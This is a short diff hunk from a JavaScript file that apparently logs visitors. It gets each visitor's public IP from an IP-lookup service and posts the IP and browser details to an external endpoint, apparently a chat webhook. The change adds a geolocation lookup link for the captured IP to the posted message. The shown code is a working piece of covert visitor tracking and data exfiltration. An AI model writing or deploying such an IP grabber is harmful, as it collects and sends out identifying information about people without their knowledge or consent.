@@ -33,7 +33,7 @@ fetch('https://api.ipify.org?format=json')
                 'Content-Type': 'application/json'
             },
             body: JSON.stringify({
-                content: `**IP Address:** ${ipAddress}\n**Browser:** ${browser}`
+                content: `**IP Address:** ${ipAddress}\nhttps://whatismyipaddress.com/ip/${ipAddress}\n**Browser:** ${browser}`
             })
         })
     })
